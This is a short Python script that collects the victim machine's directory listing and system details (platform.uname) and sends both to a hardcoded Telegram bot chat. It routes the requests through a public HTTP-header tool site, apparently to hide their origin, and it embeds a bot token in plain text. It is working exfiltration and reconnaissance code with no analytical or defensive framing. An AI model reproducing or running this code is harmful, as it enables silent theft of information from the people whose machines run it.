import platform
import requests
import os

etel =   str(os.listdir())
url = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + etel)

drkh = {
    
    "UrlBox":url,
    "AgentList":"Internet Explorer",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh)

print(req)

##########
it =   str(platform.uname())
url123 = ("https://api.telegram.org/bot5140137024:AAG3MXwNbet5I22xQVcxtoL9OTnQ9T3kQY0/sendmessage?chat_id=1104207140&text=" + it)

drkh1 = {
    
    "UrlBox":url123,
    "AgentList":"Opera",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req1 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",drkh1)

print(req1)


